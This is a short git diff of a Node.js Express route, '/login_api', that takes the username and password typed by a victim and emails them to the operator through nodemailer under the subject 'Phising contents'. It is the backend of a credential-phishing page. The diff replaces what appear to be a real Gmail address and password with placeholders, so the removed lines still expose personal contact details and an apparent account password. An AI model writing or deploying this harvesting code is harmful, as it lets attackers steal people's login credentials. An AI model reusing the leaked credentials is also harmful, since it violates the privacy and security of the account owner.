@@ -24,16 +24,16 @@ app.post('/login_api', (req, res)=>{
     var transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
-            user: 'acharyaraj9865032909@gmail.com',
-            pass: 'Sachin9865032909'
+            user: 'yourEmailHere',
+            pass: 'yourPasswordHere'
          }
      });
 
     var mailOptions = {
-        from: 'Sachin Acharya<acharyaraj71@gmail.com>',
-        to: 'acharyaraj9865032909@gmail.com',
+        from: 'Sachin Acharya<YouEmailHee>',
+        to: 'youemailhere',
         subject: 'Phising contents',
-        html: `<p><strong>Email or Phone:<strong> ${req.body.username}</p><p><strong>Password: </strong> ${req.body.pass}</p>`
+        html: `<p><strong>Email or Phone:</strong> ${req.body.username}</p><p><strong>Password: </strong> ${req.body.pass}</p>`
     }
     
     //Nodemailer SendMail
